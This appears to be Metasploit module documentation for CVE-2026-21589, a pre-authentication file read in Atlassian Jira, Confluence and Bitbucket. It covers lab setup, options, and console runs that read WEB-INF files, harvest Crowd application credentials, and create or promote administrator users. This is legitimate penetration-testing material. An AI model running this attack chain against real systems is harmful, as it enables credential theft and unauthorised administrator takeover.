## Vulnerable Application

CVE-2026-21589 affects the web resource component in supported Atlassian Data
Center products. It allows an unauthenticated attacker to read known files
within the application root.

The vendor fixed the supported traversal routes in these releases:

* Upgrade Jira Software to 9.12.40, 10.3.26, or 11.3.12.
* Upgrade Jira Service Management to 5.12.40, 10.3.26, or 11.3.12.
* Upgrade Confluence to 9.2.26 or 10.2.19.
* Upgrade Bitbucket to 9.4.26, 10.2.8, or 10.5.1.

Atlassian reports that every earlier product release is affected. Consult the
[vendor advisory](https://confluence.atlassian.com/security/cve-2026-21589-1870495748.html)
for more information about affected products.

Jira and Confluence deployments can contain Crowd application credentials in
`WEB-INF/classes/crowd.properties`. The disclosed credentials can allow user
and group changes when Crowd grants the application those permissions.

## Verification Steps

### Requirements

`READ_FILE` supports Jira, Jira Service Management, Confluence, and Bitbucket.
The Crowd-backed `CREATE_USER` and `MODIFY_PRIVILEGES` actions support Jira and
Confluence when their additional requirements are present. Bitbucket supports
only `READ_FILE`.

The privilege actions also require these conditions:

* The target contains `WEB-INF/classes/crowd.properties` with the Crowd
  application name, password, and reachable base URL.
* Set `CROWD_URL` when Crowd uses another origin or when its hostname should
  replace `RHOST` as the connection destination.
* The Crowd application is active and permits the source address used by Metasploit.
* The Crowd application can read and create users, create groups, and change
  direct memberships.
* Jira or Confluence uses a Crowd directory with `Read/Write` permissions.

A **Crowd application** (the client identity Jira or Confluence uses with
Crowd) controls the REST permissions available to the module.

The target may cache Crowd memberships. Synchronize its Crowd directory after
each privilege test.

### Installation

Create each lab in a separate directory. Install Docker with the Compose
plugin and reserve the published ports.
Run Metasploit on the Docker host. Each Atlassian application requires an
evaluation license. Change a configured subnet when it overlaps another Docker
network.

#### Confluence and Crowd

1. Save this content as `compose.yml` and replace
   `<confluence-db-password>`:

```yaml
services:
  confluence-db:
    image: postgres:17.6-alpine
    environment:
      POSTGRES_DB: confluence
      POSTGRES_USER: confluence
      POSTGRES_PASSWORD: <confluence-db-password>
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U confluence -d confluence"]
      interval: 5s
      timeout: 5s
      retries: 20
    volumes:
      - confluence-db:/var/lib/postgresql/data
    networks:
      atlassian-lab:
        ipv4_address: 172.31.250.5

  confluence:
    image: atlassian/confluence:10.2.18-ubi9-r3
    depends_on:
      confluence-db:
        condition: service_healthy
    environment:
      ATL_DB_TYPE: postgresql
      ATL_JDBC_URL: jdbc:postgresql://confluence-db:5432/confluence
      ATL_JDBC_USER: confluence
      ATL_JDBC_PASSWORD: <confluence-db-password>
      JVM_MINIMUM_MEMORY: 1g
      JVM_MAXIMUM_MEMORY: 2g
    ports:
      - "127.0.0.1:8090:8090"
    volumes:
      - confluence-home:/var/atlassian/application-data/confluence
    networks:
      atlassian-lab:
        ipv4_address: 172.31.250.10

  crowd:
    image: atlassian/crowd:7.2.4-ubi9
    ports:
      - "127.0.0.1:8095:8095"
    volumes:
      - crowd-home:/var/atlassian/application-data/crowd
    networks:
      atlassian-lab:
        ipv4_address: 172.31.250.20

volumes:
  confluence-db:
  confluence-home:
  crowd-home:

networks:
  atlassian-lab:
    ipam:
      config:
        - subnet: 172.31.250.0/24
```

2. Validate and start the project. Follow the logs until both applications
   finish starting, then stop log following with `Ctrl+C`:

```bash
docker compose config
docker compose up --detach
docker compose logs --follow confluence crowd
```

3. Confluence setup:
  - Open `http://127.0.0.1:8090/` and complete Confluence setup:
  - Enter a Confluence evaluation license.
  - Complete the new installation wizard.
  - Create a local Confluence administrator.
  - Confirm that the dashboard opens normally.

4. Crowd setup
  - Open `http://127.0.0.1:8095/crowd/`
  - Enter a Crowd evaluation license.
  - Select `New Installation`.
  - Select the embedded database.
  - Enter `http://127.0.0.1:8095/crowd/` as the base URL.
  - Create a Crowd administrator.
  - The setup creates the writable `Crowd Internal Directory`.
  - On the Crowd administration console, under `Administration` (gear icon) > `Authentication methods`
  - Allow **Basic authentication** on API calls.

5. Prepare Crowd users and groups:
  - Open `Directories` and select `Crowd Internal Directory`.
  - Open `Permissions` and enable every directory permission.
  - Create an unprivileged user to test the `MODIFY_PRIVILEGES` action (see below).
  - Do not give that user any group memberships yet.

6. Create the Crowd application
  - Open `Applications`, select `Add Application`, and enter these values:
    - Select `Confluence` type (or `Generic Application` when it is unavailable).
    - Enter `confluence` as the application name.
    - Enter a new disposable password as the application password.
    - Enter `http://127.0.0.1:8090/` as the application URL.
    - Enter `172.31.250.0/24` as the remote address.
    - Map `Crowd Internal Directory` to the application.
    - Allow every directory user to authenticate.
    - Keep the application active.
    - Open the application's `Permissions` tab.
    - Select `Crowd Internal Directory`.
    - Enable every application permission.

7. Connect Confluence to Crowd
  - In Confluence, open `General Configuration` (from `Administration` gear icon), then open `User directories`.
  - Add a directory with the `Atlassian Crowd` type.
  - Enter `http://crowd:8095/crowd/` as the server URL.
  - Enter `confluence` as the application name.
  - Enter the password created for the Crowd application.
  - Select `Read/Write` for the directory permissions.
  - Save, test, and synchronize the directory.
  - Confirm that the existing Crowd test user appears in `Users`.

8. Configure the deployed Crowd client file
  - Copy the bundled client template:
```bash
docker compose cp confluence:/opt/atlassian/confluence/confluence/WEB-INF/classes/crowd.properties ./crowd.properties
```
  - Update the listed properties without deleting other template settings:
```properties
application.name                        confluence
application.password                    <crowd-application-password>
application.login.url                   http://127.0.0.1:8095/crowd/console/
crowd.server.url                        http://crowd:8095/crowd/services/
crowd.base.url                          http://127.0.0.1:8095/crowd/
```
  - Make the file readable:
```bash
chmod 0644 ./crowd.properties
```
  - Add this bind mount beneath `confluence.volumes` in `compose.yml`:
```yaml
      - ./crowd.properties:/opt/atlassian/confluence/confluence/WEB-INF/classes/crowd.properties:ro
```
  - Validate the updated file and recreate Confluence:
```bash
docker compose config
docker compose up --detach --force-recreate confluence
```

#### Jira and Crowd

1. Save this content as `compose.yml` and replace `<jira-db-password>`:

```yaml
services:
  jira-db:
    image: postgres:16.6-alpine
    environment:
      POSTGRES_DB: jira
      POSTGRES_USER: jira
      POSTGRES_PASSWORD: <jira-db-password>
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U jira -d jira"]
      interval: 5s
      timeout: 5s
      retries: 20
    volumes:
      - jira-db:/var/lib/postgresql/data
    networks:
      atlassian-jira-lab:
        ipv4_address: 172.31.251.5

  jira:
    image: atlassian/jira-software:10.3.25-ubi9
    depends_on:
      jira-db:
        condition: service_healthy
    environment:
      ATL_DB_TYPE: postgres72
      ATL_DB_DRIVER: org.postgresql.Driver
      ATL_JDBC_URL: jdbc:postgresql://jira-db:5432/jira
      ATL_JDBC_USER: jira
      ATL_JDBC_PASSWORD: <jira-db-password>
      JVM_MINIMUM_MEMORY: 1g
      JVM_MAXIMUM_MEMORY: 2g
    ports:
      - "127.0.0.1:8080:8080"
    volumes:
      - jira-home:/var/atlassian/application-data/jira
    networks:
      atlassian-jira-lab:
        ipv4_address: 172.31.251.10

  crowd:
    image: atlassian/crowd:7.2.4-ubi9
    ports:
      - "127.0.0.1:8095:8095"
    volumes:
      - crowd-home:/var/atlassian/application-data/crowd
    networks:
      atlassian-jira-lab:
        ipv4_address: 172.31.251.20

volumes:
  jira-db:
  jira-home:
  crowd-home:

networks:
  atlassian-jira-lab:
    ipam:
      config:
        - subnet: 172.31.251.0/24
```

2. Validate and start the project. Follow the logs until both applications
   finish starting, then stop log following with `Ctrl+C`:

```bash
docker compose config
docker compose up --detach
docker compose logs --follow jira crowd
```

3. Jira setup:
  - Open `http://127.0.0.1:8080/` and complete Jira setup.
  - Enter a Jira Software evaluation license.
  - Complete the new installation wizard.
  - Create a local Jira administrator.
  - Confirm that the dashboard opens normally.

4. Follow steps 4 through 8 under `Confluence and Crowd`, with these
   Jira-specific differences:
  - Select Jira or `Generic Application` as the Crowd application type.
    Use `jira` as its name, `http://127.0.0.1:8080/` as its URL, and
    `172.31.251.0/24` as its remote address.
  - Open `User management` > `User directories` when adding the Crowd
    directory to Jira. Use `jira` as its application name.
  - Jira does not include the client template. Create `crowd.properties`
    beside `compose.yml` using the Confluence properties block, but change
    `application.name` to `jira`.
  - Mount the file at
    `/opt/atlassian/jira/atlassian-jira/WEB-INF/classes/crowd.properties`.
    Recreate the `jira` service after validating `compose.yml`.

#### Bitbucket

1. Save this content as `compose.yml` and replace
   `<bitbucket-db-password>`:

```yaml
services:
  bitbucket-db:
    image: postgres:16.6-alpine
    environment:
      POSTGRES_DB: bitbucket
      POSTGRES_USER: bitbucket
      POSTGRES_PASSWORD: <bitbucket-db-password>
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bitbucket -d bitbucket"]
      interval: 5s
      timeout: 5s
      retries: 20
    volumes:
      - bitbucket-db:/var/lib/postgresql/data

  bitbucket:
    image: atlassian/bitbucket:10.2.7-ubi9
    depends_on:
      bitbucket-db:
        condition: service_healthy
    environment:
      JDBC_DRIVER: org.postgresql.Driver
      JDBC_URL: jdbc:postgresql://bitbucket-db:5432/bitbucket?targetServerType=master
      JDBC_USER: bitbucket
      JDBC_PASSWORD: <bitbucket-db-password>
      JVM_MINIMUM_MEMORY: 1g
      JVM_MAXIMUM_MEMORY: 2g
    ports:
      - "127.0.0.1:7990:7990"
    volumes:
      - bitbucket-home:/var/atlassian/application-data/bitbucket

volumes:
  bitbucket-db:
  bitbucket-home:
```

2. Validate and start the project. Follow the log until Bitbucket finishes
   starting, then stop log following with `Ctrl+C`:

```bash
docker compose config
docker compose up --detach
docker compose logs --follow bitbucket
```

3. Bitbucket setup:
  - Open `http://127.0.0.1:7990/` and complete Bitbucket setup.
  - Enter a Bitbucket evaluation license.
  - Complete the new installation wizard.
  - Create a local Bitbucket administrator.
  - Confirm that the dashboard opens normally.

### Module Execution

1. Install an affected Jira, Confluence, or Bitbucket release.
2. Configure Crowd as described above when testing a privilege action.
3. Start Metasploit Framework from the source checkout.
4. Run: `use auxiliary/admin/http/atlassian_data_center_cve_2026_21589`
5. Run: `set RHOSTS <target-host>`
6. Run: `set RPORT <target-port>`
7. Run: `set TARGETURI <target-base-path>`
8. Run: `check`
9. Optionally run: `set FILE_PATH <application-relative-file-path>`
10. Run: `run`
11. Verify that Metasploit stores the disclosed file as loot.
12. For Jira or Confluence, run: `set ACTION CREATE_USER`
13. Run: `set CROWD_URL <reachable-crowd-base-url>` when Crowd uses a different
    scheme, host, or port.
14. Run: `check`
15. Run: `run`
16. Verify the new user's configured memberships and permissions.
17. Run: `set ACTION MODIFY_PRIVILEGES`
18. Run: `set USERNAME <existing-user>`
19. Run: `check`
20. Run: `run`
21. Verify the existing user's configured memberships and permissions.

## Options

### ACTION

`READ_FILE` reads and stores the selected application file. This is the default
action and supports every detected product.

`CREATE_USER` creates a Crowd user and adds the selected access and
administrator memberships. Jira and Confluence support this action.

`MODIFY_PRIVILEGES` adds the memberships to an existing Crowd user. Jira and
Confluence support this action.

The `check` result describes compatibility with the currently selected action.

### FILE_PATH

Set a file path relative to the application root for `READ_FILE`, such as
`WEB-INF/web.xml`. The module rejects control characters but otherwise passes
this value to the traversal without validating its syntax. When unset, the
module reads the protected file used to fingerprint the detected product.

### CROWD_URL

Set the Crowd base URL when Crowd uses another scheme, host, or port. Setting
this option explicitly approves that connection and can override an unsuitable
URL from `crowd.properties`. Include the Crowd context path. For example, use
`https://crowd.example.test/crowd/`.

When this option is unset, a same-origin Crowd URL keeps `RHOST` as the network
destination. The URL still supplies the Crowd virtual host and TLS hostname.

### USERNAME

Set the Crowd username to create or promote. `CREATE_USER` generates a random
username with Faker when this option is unset. `MODIFY_PRIVILEGES` requires an
existing username.

### PASSWORD

Set the password assigned to the created Crowd user. This option only applies
to `CREATE_USER` and has a random 16-character default.

### ADMIN_GROUP

Override the Crowd group that grants administrator permission in the target
product. Confluence defaults to `confluence-administrators`. Jira selects
`jira-system-administrators` or `jira-administrators`.

### ACCESS_GROUP

Optionally add the user to an existing Crowd group that grants application access.
The default administrator group is usually sufficient, so this option has no
default. Set it when Crowd or the target product requires a separate access group.
The module cannot assign access permissions, so it cannot create this group.

### CREATE_MISSING_ADMIN_GROUP

Create the selected administrator group when it does not exist. This option
defaults to `true`. Crowd application credentials require group-creation
permission when this option creates the group.

## Scenarios

### Confluence 10.2.18 with Crowd 7.2.4
- Check method
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > check verbose=true rhosts=127.0.0.1 rport=8090
[+] 127.0.0.1:8090 - The target is vulnerable. Atlassian Confluence 10.2.18 disclosed WEB-INF/web.xml; READ_FILE is supported within the application root
```

- `READ_FILE` action (default)
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8090
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Confluence 10.2.18 disclosed WEB-INF/web.xml; READ_FILE is supported within the application root
[+] Atlassian Confluence disclosed 'WEB-INF/web.xml'; file saved to /home/n00tmeg/.msf4/loot/20261103201213_default_127.0.0.1_atlassian.conflu_019300.xml
[*] Auxiliary module execution completed
```

- `CREATE_USER` action
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action CREATE_USER
action => CREATE_USER
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8090 crowd_url=http://127.0.0.1:8095/crowd/
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Confluence 10.2.18 disclosed WEB-INF/web.xml; CREATE_USER found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified
[*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
[*] Creating Crowd user 'zack.maggio'
[+] Created Crowd user 'zack.maggio'; its password is stored in PASSWORD
[*] Adding Crowd user 'zack.maggio' to 'confluence-administrators'
[+] Crowd user 'zack.maggio' is a direct member of 'confluence-administrators'
[*] The target application may require a Crowd directory synchronization before the membership becomes active
[*] Auxiliary module execution completed
```

- `MODIFY_PRIVILEGES` action
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action MODIFY_PRIVILEGES
action => MODIFY_PRIVILEGES
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8090 crowd_url=http://127.0.0.1:8095/crowd/ username=msftest
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Confluence 10.2.18 disclosed WEB-INF/web.xml; MODIFY_PRIVILEGES found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified
[*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
[*] Adding Crowd user 'msftest' to 'confluence-administrators'
[+] Crowd user 'msftest' is a direct member of 'confluence-administrators'
[*] The target application may require a Crowd directory synchronization before the membership becomes active
[*] Auxiliary module execution completed
```

- Database
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > hosts

Hosts
=====

address    mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------    ---  ----  -------  ---------  -----  -------  ----  --------
127.0.0.1             Unknown                    device

msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > services
Services
========

host       port  proto  name                  state  info                                      resource           parents
----       ----  -----  ----                  -----  ----                                      --------           -------
127.0.0.1  8090  tcp    tcp                   open                                             {}
127.0.0.1  8090  tcp    atlassian-confluence  open   Atlassian Confluence Data Center 10.2.18  {"uri":"/"}        http (8090/tcp)
127.0.0.1  8090  tcp    http                  open                                             {}                 tcp (8090/tcp)
127.0.0.1  8095  tcp    tcp                   open                                             {}
127.0.0.1  8095  tcp    atlassian-crowd       open   Atlassian Crowd                           {"uri":"/crowd/"}  http (8095/tcp)
127.0.0.1  8095  tcp    http                  open                                             {}                 tcp (8095/tcp)

msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > creds
Credentials
===========

id  host       origin     service                          public       private                       realm  private_type  JtR Format  cracked_password
--  ----       ------     -------                          ------       -------                       -----  ------------  ----------  ----------------
19  127.0.0.1  127.0.0.1  8090/tcp (atlassian-confluence)  confluence   <crowd-application-password>         Password
19  127.0.0.1  127.0.0.1  8095/tcp (atlassian-crowd)       confluence   <crowd-application-password>         Password
20  127.0.0.1  127.0.0.1  8095/tcp (atlassian-crowd)       zack.maggio  <generated-password>                 Password

msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > vulns

Vulnerabilities
===============

Timestamp                Host       Service                          Resource  Name                                                                       References
---------                ----       -------                          --------  ----                                                                       ----------
2026-11-03 19:10:33 UTC  127.0.0.1  atlassian-confluence (8090/tcp)  {}        Atlassian Data Center CVE-2026-21589 Arbitrary File Read and Crowd Privil  CVE-2026-21589,URL-https://confluence.atlassian.com/security/cve-2026-215
                                                                               ege Escalation                                                             89-arbitrary-file-access-vulnerability-impacts-multiple-products-18704957
                                                                                                                                                          48.html,URL-https://labs.watchtowr.com/you-wont-hear-about-these-even-in-
                                                                                                                                                          myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve
                                                                                                                                                          -2026-21589/,URL-https://github.com/watchtowrlabs/watchTowr-vs-Atlassian-
                                                                                                                                                          CVE-2026-21589
2026-11-03 19:10:33 UTC  127.0.0.1  tcp (8090/tcp)                   {}        Atlassian Data Center CVE-2026-21589 Arbitrary File Read and Crowd Privil  CVE-2026-21589,URL-https://confluence.atlassian.com/security/cve-2026-215
                                                                               ege Escalation                                                             89-arbitrary-file-access-vulnerability-impacts-multiple-products-18704957
                                                                                                                                                          48.html,URL-https://labs.watchtowr.com/you-wont-hear-about-these-even-in-
                                                                                                                                                          myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve
                                                                                                                                                          -2026-21589/,URL-https://github.com/watchtowrlabs/watchTowr-vs-Atlassian-
                                                                                                                                                          CVE-2026-21589

msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > loot

Loot
====

host       service               type                       name     content                        info                                                    path
----       -------               ----                       ----     -------                        ----                                                    ----
127.0.0.1  atlassian-confluence  atlassian.confluence.file  web.xml  application/xml;charset=UTF-8  Atlassian Confluence application file: WEB-INF/web.xml  /home/n00tmeg/.msf4/loot/20261103201213_default_127.0.0.1_atlassian.conflu_019300.xml
```

### Jira 10.3.25 with Crowd 7.2.4
- Check method
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action READ_FILE
action => READ_FILE
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > check verbose=true rhosts=127.0.0.1 rport=8080
[+] 127.0.0.1:8080 - The target is vulnerable. Atlassian Jira 10.3.25 disclosed WEB-INF/web.xml; READ_FILE is supported within the application root
```

- `READ_FILE` action (default)
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8080 crowd_url=http://127.0.0.1:8095/crowd/
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Jira 10.3.25 disclosed WEB-INF/web.xml; READ_FILE is supported within the application root
[+] Atlassian Jira disclosed 'WEB-INF/web.xml'; file saved to /home/n00tmeg/.msf4/loot/20261103205457_default_127.0.0.1_atlassian.jira.f_750022.xml
[*] Auxiliary module execution completed
```

- `CREATE_USER` action
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action CREATE_USER
action => CREATE_USER
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8080 crowd_url=http://127.0.0.1:8095/crowd/
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Jira 10.3.25 disclosed WEB-INF/web.xml; CREATE_USER found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified
[*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
[*] Creating Crowd group 'jira-administrators'
[*] Creating Crowd user 'audria_koch'
[+] Created Crowd user 'audria_koch'; its password is stored in PASSWORD
[*] Adding Crowd user 'audria_koch' to 'jira-administrators'
[+] Crowd user 'audria_koch' is a direct member of 'jira-administrators'
[*] The target application may require a Crowd directory synchronization before the membership becomes active
[*] Auxiliary module execution completed
```

- `MODIFY_PRIVILEGES` action
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action MODIFY_PRIVILEGES
action => MODIFY_PRIVILEGES
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=8080 crowd_url=http://127.0.0.1:8095/crowd/ username=msftest
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Jira 10.3.25 disclosed WEB-INF/web.xml; MODIFY_PRIVILEGES found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified
[*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
[*] Adding Crowd user 'msftest' to 'jira-administrators'
[+] Crowd user 'msftest' is a direct member of 'jira-administrators'
[*] The target application may require a Crowd directory synchronization before the membership becomes active
[*] Auxiliary module execution completed
```

### Bitbucket 10.2.7
- Check method
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > set action READ_FILE
action => READ_FILE
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > check verbose=true rhosts=127.0.0.1 rport=7990
[+] 127.0.0.1:7990 - The target is vulnerable. Atlassian Bitbucket 10.2.7 disclosed WEB-INF/urlrewrite.xml; READ_FILE is supported within the application root
```

- `READ_FILE` action (default)
```
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=true rhosts=127.0.0.1 rport=7990
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Atlassian Bitbucket 10.2.7 disclosed WEB-INF/urlrewrite.xml; READ_FILE is supported within the application root
[+] Atlassian Bitbucket disclosed 'WEB-INF/urlrewrite.xml'; file saved to /home/n00tmeg/.msf4/loot/20261103225058_default_127.0.0.1_atlassian.bitbuc_090212.xml
[*] Auxiliary module execution completed
msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > loot

Loot
====

host       service              type                      name            content                 info                                                          path
----       -------              ----                      ----            -------                 ----                                                          ----
127.0.0.1  atlassian-bitbucket  atlassian.bitbucket.file  urlrewrite.xml  text/xml;charset=UTF-8  Atlassian Bitbucket application file: WEB-INF/urlrewrite.xml  /home/n00tmeg/.msf4/loot/20261103225058_default_127.0.0.1_atlassian.bitbuc_090212.xml
```
